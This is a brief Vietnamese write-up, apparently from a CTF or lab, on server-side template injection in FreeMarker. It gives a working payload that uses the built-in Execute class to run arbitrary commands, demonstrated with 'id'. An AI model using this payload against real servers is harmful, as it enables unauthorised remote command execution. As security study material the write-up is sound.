## Overview  
Server sử dụng Freemaker template. Một template của java. Freemaker có sẵn class `Execute` cho phép chạy command tùy ý.  
Payload: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }` 

Khi chèn thêm payload trên, khai báo một object `Execute` cho phép chạy các command tùy ý.

![image](https://user-images.githubusercontent.com/22276823/126868269-47d08e56-74e8-435d-9c1d-a6cc89bec086.png)  
